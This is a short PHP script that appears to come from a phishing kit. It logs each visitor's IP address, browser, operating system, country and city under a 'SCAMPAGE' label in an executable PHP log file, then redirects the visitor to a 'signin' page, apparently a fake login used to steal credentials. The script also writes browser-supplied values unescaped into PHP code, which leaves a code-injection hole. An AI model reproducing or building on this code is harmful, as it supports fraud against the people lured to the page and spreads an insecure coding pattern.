<?php

include_once 'detect.php';
include_once 'detect_os.php';
date_default_timezone_set("Asia/Bangkok");

$dt = date("l, F j Y h:i:s A");
$dt1 = strtotime(date("Y-m-d H:i:s"));

$msg = "<?php ".'$start = '.'"'.$dt1.'"; '." ".'$end = '.'strtotime(date("Y-m-d H:i:s"))'."; ".' '." echo '<font color=blue>SCAMPAGE</font> > ".$ip.", ".$user_browser.", ".$user_os.", ".$nama_negara.", ".$kota.", ".date('Y-m-d').", <font color=red>'; ".' echo round(abs($end - $start) / 60,0). " minute ago </font><br/>"; ?>'."
";

$file=fopen("visitor_log.php","a");
fwrite($file, $msg);
fclose($file);
header("location: signin");
exit;

?>